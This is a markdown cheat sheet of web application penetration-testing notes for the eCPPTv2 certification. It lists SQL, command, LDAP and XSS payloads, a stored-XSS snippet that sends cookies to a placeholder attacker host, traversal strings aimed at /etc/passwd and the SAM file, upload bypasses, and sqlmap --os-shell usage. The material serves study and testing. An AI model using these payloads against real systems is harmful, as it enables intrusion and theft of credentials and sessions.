# Web App Security - eCPPTv2

## Overview
Web application security testing including common vulnerabilities, exploitation techniques, and tools.

**Sources**: 
- [johnermac.github.io](https://johnermac.github.io/notes/ecppt/webapp/)
- [dev-angelist/eCPPTv2-PTP-Notes](https://github.com/dev-angelist/eCPPTv2-PTP-Notes)

## Common Vulnerabilities

### OWASP Top 10
1. Injection
2. Broken Authentication
3. Sensitive Data Exposure
4. XML External Entities (XXE)
5. Broken Access Control
6. Security Misconfiguration
7. Cross-Site Scripting (XSS)
8. Insecure Deserialization
9. Using Components with Known Vulnerabilities
10. Insufficient Logging & Monitoring

## Injection Attacks

### SQL Injection
```bash
# Basic
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*

# Union-based
' UNION SELECT NULL--
' UNION SELECT username,password FROM users--

# Boolean-based
' AND 1=1--
' AND 1=2--

# Time-based
'; WAITFOR DELAY '00:00:05'--
```

### Command Injection
```bash
# Basic
; whoami
| whoami
`whoami`
$(whoami)
```

### LDAP Injection
```bash
# Basic
*)(&
*))%00
```

## Cross-Site Scripting (XSS)

### Reflected XSS
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
```

### Stored XSS
```javascript
<script>
var i = new Image();
i.src="http://<attacker>/get.php?cookies="+document.cookie;
</script>
```

### DOM-based XSS
```javascript
# URL manipulation
http://example.com/page.html#<script>alert('XSS')</script>
```

## Authentication Bypass

### SQL Injection in Login
```sql
admin' --
admin' OR '1'='1' --
admin' UNION SELECT NULL,NULL--
```

### Session Management
- Session fixation
- Session hijacking
- Session prediction

## File Upload Vulnerabilities

### Dangerous Extensions
- `.php`, `.jsp`, `.asp`, `.aspx`
- `.phtml`, `.php3`, `.php4`, `.php5`

### Bypass Techniques
- Double extension: `.php.jpg`
- Null byte: `shell.php%00.jpg`
- Case variation: `.PhP`
- MIME type manipulation

## Directory Traversal

```bash
# Basic
../../../etc/passwd
..\..\..\windows\system32\config\sam

# Encoded
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encoding
..%252F..%252F..%252Fetc%252Fpasswd

# Unicode
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
```

## Tools

### Burp Suite
- Proxy
- Repeater
- Intruder
- Scanner
- Extensions

### SQLMap
```bash
# Basic
sqlmap -u <URL> -p <parameter>

# From request file
sqlmap -r <request_file>

# POST request
sqlmap -u <URL> --data="param=value" -p param

# Dump database
sqlmap -u <URL> --dump

# OS shell
sqlmap -u <URL> --os-shell

# Batch mode
sqlmap -u <URL> --batch

# Custom headers
sqlmap -u <URL> --headers="Cookie: session=value"
```

### OWASP ZAP
- Automated scanner
- Manual testing tools
- Fuzzer

### Nikto
```bash
nikto -h <target>
nikto -h <target> -p <ports>
nikto -h <target> -Format txt -o report.txt
```

### Gobuster
```bash
# Directory enumeration
gobuster dir -u http://target -w wordlist.txt

# DNS enumeration
gobuster dns -d target.com -w wordlist.txt

# Virtual host enumeration
gobuster vhost -u http://target -w wordlist.txt
```

### Wfuzz
```bash
# Parameter fuzzing
wfuzz -c -z file,wordlist.txt http://target/page?FUZZ=value

# Header fuzzing
wfuzz -c -z file,wordlist.txt -H "Header: FUZZ" http://target/page
```

### Burp Suite Extensions
- **Active Scan++** - Enhanced active scanning
- **Param Miner** - Parameter discovery
- **J2EEScan** - Java application scanning
- **Retire.js** - JavaScript library scanning
```

### Manual Testing Checklist
- [ ] Authentication bypass
- [ ] SQL injection
- [ ] XSS (Reflected, Stored, DOM-based)
- [ ] Command injection
- [ ] File upload vulnerabilities
- [ ] Directory traversal
- [ ] XXE
- [ ] SSRF
- [ ] IDOR
- [ ] CSRF
- [ ] Insecure deserialization
- [ ] Business logic flaws

## Web Application Methodology

### 1. Reconnaissance
- Identify technologies
- Map application structure
- Identify entry points
- Enumerate directories

### 2. Authentication Testing
- Test login mechanisms
- Test password reset
- Test account creation
- Test session management

### 3. Input Validation
- Test all input fields
- Test file uploads
- Test search functions
- Test API endpoints

### 4. Authorization Testing
- Test access controls
- Test IDOR vulnerabilities
- Test privilege escalation
- Test horizontal/vertical access

### 5. Business Logic
- Test workflow bypasses
- Test race conditions
- Test payment bypasses
- Test application-specific logic

## Resources
- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
- **PortSwigger Web Security Academy**: https://portswigger.net/web-security

## Last Updated
January 2025

